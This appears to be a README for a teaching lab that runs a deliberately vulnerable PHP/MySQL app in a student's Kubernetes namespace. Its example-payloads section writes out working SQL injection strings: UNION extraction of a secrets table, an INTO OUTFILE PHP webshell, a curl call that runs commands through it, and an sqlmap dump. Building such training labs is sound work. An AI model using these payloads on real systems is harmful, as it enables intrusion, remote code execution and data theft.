# Exercise: SQL Injection (v2 / Kubernetes port)

The v2 port of the v1 `sqli-demo`. Same vulnerability, same exploit chain, now running as
a Kubernetes workload inside a student's isolated namespace and attacked from the in-browser
Kali shell.

## What changed from v1 (and why)

| v1 (docker-compose)                                  | v2 (Kubernetes)                                            |
|------------------------------------------------------|------------------------------------------------------------|
| `web`, `db`, `db-grant` as 3 services + named volume | One pod (web + db) sharing an `emptyDir` web root           |
| `db-grant` container runs `GRANT FILE` after startup | `GRANT FILE` folded into `init.sql` (user exists pre-init)  |
| `index.php` bind-mounted over the image              | App baked into image, copied into web root by an init container |
| `platform: linux/arm64` pinned                       | Multi-arch image; k8s schedules the node's arch            |

The exploit chain is unchanged: **SQLi → UNION exfiltration → `INTO OUTFILE` webshell → RCE.**

## Files
- `images/web/Dockerfile` — vulnerable PHP/Apache front-end (app baked into `/opt/app`).
- `src/` — `index.php` (vulnerable query), `check.php` (diagnostics), `logo.png`.
- `init.sql` — schema, seed users, `secrets` table (+ flag), and the FILE grant.
- `manifest.yaml` — Deployment (web+db) + Services (`sqli-web`, `sqli-db`).
- `meta.yaml` — descriptor (arch support, objectives, flag).

## Deploy (local dev)
From `v2/`:
```bash
make slice-up        # builds the web image, deploys this exercise + Kali into lab-student-01
make shell           # browser shell -> http://localhost:7681
```
From the Kali shell the target is `http://sqli-web`.

## Example payloads (reachable from the Kali shell against http://sqli-web)
The vulnerable query selects **4 columns** (`user_id, first_name, last_name, user`), so
UNION payloads need 4 columns; the value lands in column 2 (displayed):
```sql
1' OR '1'='1
1' UNION SELECT NULL, secret_data, NULL, NULL FROM secrets-- -          # grab the flag
1' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL, NULL
        INTO OUTFILE '/var/www/html/shell.php'-- -                      # webshell
```
```bash
curl 'http://sqli-web/shell.php?cmd=id'
sqlmap -u 'http://sqli-web/' --data 'user_id=1' --batch --dump
```

## Reset
`make slice-down && make slice-up` (or, in Phase 2, the controller's "reset" button) gives a
clean instance and removes any uploaded webshells.
